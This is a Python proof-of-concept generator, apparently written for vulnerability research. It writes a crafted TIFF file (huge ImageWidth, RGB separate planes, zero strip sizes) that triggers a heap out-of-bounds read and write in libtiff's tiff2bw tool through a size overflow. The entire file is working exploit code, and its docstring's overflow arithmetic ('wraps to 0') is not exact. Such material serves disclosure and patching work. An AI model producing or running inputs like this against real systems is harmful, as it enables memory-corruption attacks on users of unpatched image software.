#!/usr/bin/env python3
"""
PoC generator for VULN 003: Heap OOB Read+Write via Zero-Size inbuf/outbuf Allocation
in compresssep (RGB SEPARATE) in libtiff/tools/tiff2bw.c

Root Cause:
  TIFF with PHOTOMETRIC_RGB, PLANARCONFIG_SEPARATE, BitsPerSample=8,
  ImageWidth >= 2^29 causes TIFFScanlineSize() to overflow (w*8 wraps to 0).
  rowsize = 0, inbuf = _TIFFmalloc(3*0) = 0-byte allocation.
  compresssep() then loops w times reading from the 0-byte inbuf -> Heap OOB.
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_003.tif")

def pack_le(fmt, *args):
    return struct.pack('<' + fmt, *args)

def ifd_entry(tag, typ, count, val_or_offset):
    """Pack one IFD entry: tag(H) type(H) count(I) value_or_offset(I)"""
    return pack_le('HHII', tag, typ, count, val_or_offset)

# TIFF type codes
SHORT  = 3
LONG   = 4
RATIONAL = 5

# Trigger value: 2^29 + 1 overflows w*8 in 32-bit arithmetic
IMAGE_WIDTH  = 536870913  # 0x20000001 = 2^29 + 1
IMAGE_HEIGHT = 1

# === Layout planning ===
# TIFF header:          8 bytes  (offset 0)
# IFD starts at:        8
# 13 IFD entries * 12 = 156 bytes
# Next-IFD pointer:     4 bytes
# IFD block ends at:    8 + 2 + 156 + 4 = 170   (IFD entry count = 2 bytes)
# Actually: 8 (header) + 2 (count) + 13*12 (entries) + 4 (next IFD) = 170

IFD_OFFSET = 8          # right after header
IFD_ENTRY_COUNT = 13
IFD_BLOCK_SIZE = 2 + IFD_ENTRY_COUNT * 12 + 4  # 162
DATA_AREA_START = IFD_OFFSET + IFD_BLOCK_SIZE   # 170

# Data blobs to place in the data area:
# 1. BitsPerSample:    3 SHORTs = 6 bytes → pad to 8 → offset DATA_AREA_START
# 2. StripOffsets:     3 LONGs  = 12 bytes → offset DATA_AREA_START + 8
# 3. StripByteCounts:  3 LONGs  = 12 bytes → offset DATA_AREA_START + 20
# 4. XResolution:      2 LONGs  = 8 bytes  → offset DATA_AREA_START + 32
# 5. YResolution:      2 LONGs  = 8 bytes  → offset DATA_AREA_START + 40
# Then strip data area (even just 1 byte placeholder so offsets are valid)
# strip data at: DATA_AREA_START + 48

BITS_PER_SAMPLE_OFFSET  = DATA_AREA_START       # 170
STRIP_OFFSETS_OFFSET    = DATA_AREA_START + 8   # 178
STRIP_BYTECOUNTS_OFFSET = DATA_AREA_START + 20  # 190
XRES_OFFSET             = DATA_AREA_START + 32  # 202
YRES_OFFSET             = DATA_AREA_START + 40  # 210
STRIP_DATA_OFFSET       = DATA_AREA_START + 48  # 218

# Build data area
data_area  = pack_le('HHH', 8, 8, 8)       # BitsPerSample: 3 shorts (6 bytes)
data_area += b'\x00\x00'                    # padding to 8 bytes

# StripOffsets: 3 longs, all pointing to strip data area (valid bytes exist there)
data_area += pack_le('III',
    STRIP_DATA_OFFSET,
    STRIP_DATA_OFFSET,
    STRIP_DATA_OFFSET)

# StripByteCounts: 3 longs, all = 0 (zero-size strips match zero rowsize)
data_area += pack_le('III', 0, 0, 0)

# XResolution: rational 72/1
data_area += pack_le('II', 72, 1)
# YResolution: rational 72/1
data_area += pack_le('II', 72, 1)

# Minimal strip data placeholder (1 byte so the offset is within file bounds)
data_area += b'\x00'

# === Build IFD entries (must be sorted by tag) ===
# Tags in ascending order:
# 0x0100=256 ImageWidth   LONG   1  536870913
# 0x0101=257 ImageLength  LONG   1  1
# 0x0102=258 BitsPerSample SHORT  3  offset
# 0x0103=259 Compression  SHORT  1  1  (no compression)
# 0x0106=262 PhotometricInterp SHORT 1 2 (RGB)
# 0x0111=273 StripOffsets LONG   3  offset
# 0x0115=277 SamplesPerPixel SHORT 1 3
# 0x0116=278 RowsPerStrip LONG   1  1
# 0x0117=279 StripByteCounts LONG 3 offset
# 0x011A=282 XResolution  RATIONAL 1 offset
# 0x011B=283 YResolution  RATIONAL 1 offset
# 0x011C=284 PlanarConfig SHORT  1  2 (SEPARATE)
# 0x0128=296 ResolutionUnit SHORT 1 2

ifd_entries  = ifd_entry(0x0100, LONG,     1, IMAGE_WIDTH)
ifd_entries += ifd_entry(0x0101, LONG,     1, IMAGE_HEIGHT)
ifd_entries += ifd_entry(0x0102, SHORT,    3, BITS_PER_SAMPLE_OFFSET)
ifd_entries += ifd_entry(0x0103, SHORT,    1, 1)   # Compression=1 (none)
ifd_entries += ifd_entry(0x0106, SHORT,    1, 2)   # Photometric=2 (RGB)
ifd_entries += ifd_entry(0x0111, LONG,     3, STRIP_OFFSETS_OFFSET)
ifd_entries += ifd_entry(0x0115, SHORT,    1, 3)   # SamplesPerPixel=3
ifd_entries += ifd_entry(0x0116, LONG,     1, 1)   # RowsPerStrip=1
ifd_entries += ifd_entry(0x0117, LONG,     3, STRIP_BYTECOUNTS_OFFSET)
ifd_entries += ifd_entry(0x011A, RATIONAL, 1, XRES_OFFSET)
ifd_entries += ifd_entry(0x011B, RATIONAL, 1, YRES_OFFSET)
ifd_entries += ifd_entry(0x011C, SHORT,    1, 2)   # PlanarConfig=2 (SEPARATE)
ifd_entries += ifd_entry(0x0128, SHORT,    1, 2)   # ResolutionUnit=2 (inch)

assert IFD_ENTRY_COUNT == 13
assert len(ifd_entries) == IFD_ENTRY_COUNT * 12

# === Assemble file ===
# TIFF little-endian header: "II" + 42 + IFD_OFFSET
header = b'II' + pack_le('HI', 42, IFD_OFFSET)

ifd_block  = pack_le('H', IFD_ENTRY_COUNT)
ifd_block += ifd_entries
ifd_block += pack_le('I', 0)  # next IFD = 0 (no more IFDs)

tiff_data = header + ifd_block + data_area

# Sanity checks on offsets
assert len(header) == 8
assert IFD_OFFSET == 8
assert len(ifd_block) == IFD_BLOCK_SIZE, f"IFD block size mismatch: {len(ifd_block)} vs {IFD_BLOCK_SIZE}"
assert STRIP_DATA_OFFSET <= len(tiff_data), f"Strip data offset {STRIP_DATA_OFFSET} beyond file size {len(tiff_data)}"

with open(OUTPUT_FILE, 'wb') as f:
    f.write(tiff_data)

print(f"Generated: {OUTPUT_FILE} ({len(tiff_data)} bytes)")
print(f"  ImageWidth   = {IMAGE_WIDTH} (0x{IMAGE_WIDTH:08x}) — triggers overflow")
print(f"  PlanarConfig = SEPARATE (2)")
print(f"  Photometric  = RGB (2)")
print(f"  BitsPerSample= 8,8,8")
print(f"  SamplesPerPixel= 3")
print(f"  StripByteCounts = 0,0,0")
